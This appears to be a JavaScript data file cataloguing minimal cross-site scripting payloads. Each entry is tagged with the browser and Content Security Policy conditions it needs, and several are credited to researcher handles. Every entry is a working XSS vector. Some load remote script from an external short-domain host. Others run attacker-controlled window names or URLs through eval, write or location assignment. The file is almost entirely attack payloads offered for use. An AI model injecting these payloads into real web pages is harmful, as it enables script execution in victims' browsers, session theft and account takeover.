const TAGS = {
    chrome: 'chromium',
    firefox: 'firefox',
    safari: 'safari',
    unsafeInline: 'script-unsafe-inline',
    unsafeInlineStyle: 'style-unsafe-inline',
    unsafeEval: 'unsafe-eval',
    scripts: 'external-scripts',
    iframes: 'external-iframes',
    controlsLength: 'controls-index-of-iframe',
    controlsName: 'controls-name',
    controlsURL: 'controls-URL',
    notInner: 'not-innerHTML'
}

const PAYLOADS = [
    {
        html: '<script/src=//Ǌ.₨><\/script>',
        tags: [TAGS.scripts, TAGS.notInner],
        author: null,
    },
    {
        html: '<iframe/onload=src=top.name>',
        tags: [TAGS.unsafeInline, TAGS.controlsName],
        author: '@terjanq'
    },
    {
        html: '<iframe/onload=src=top[0].name+/\\Ǌ.₨/>',
        tags: [TAGS.iframes, TAGS.unsafeInline, TAGS.controlsLength],
        author: '@terjanq'
    },
    {
        html: '<iframe/onload=src=contentWindow.name+/\\Ǌ.₨/>',
        tags: [TAGS.iframes, TAGS.unsafeInline],
        author: '@terjanq'
    },
    {
        html: '<iframe/srcdoc="<script/src=//Ǌ.₨><\/script>">',
        tags: [TAGS.scripts],
        author: null,
    },
    {
        html: '<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">',
        tags: [TAGS.firefox, TAGS.scripts],
        author: null,
    },
    {
        html: "<iframe/onload=eval(`'`+URL)>",
        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL],
        author: '@wcbowling'
    },
    {
        html: "<iframe/onload=write(URL)>",
        tags: [TAGS.safari, TAGS.unsafeInline, TAGS.controlsURL],
        author: '@kinugawamasato'
    },
    {
        html: "<svg/onload=eval(name)>",
        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName],
        author: null,
    },
    {
        html: "<svg/onload=eval(`'`+URL)>",
        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsURL],
        author: '@wcbowling'
    },
    {
        html: "<svg/onload=location=name>",
        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.controlsName],
        author: null
    },
    {
        html: "<style/onload=eval(name)>",
        tags: [TAGS.chrome, TAGS.unsafeInlineStyle, TAGS.controlsName, TAGS.unsafeEval],
        author: null
    }
]
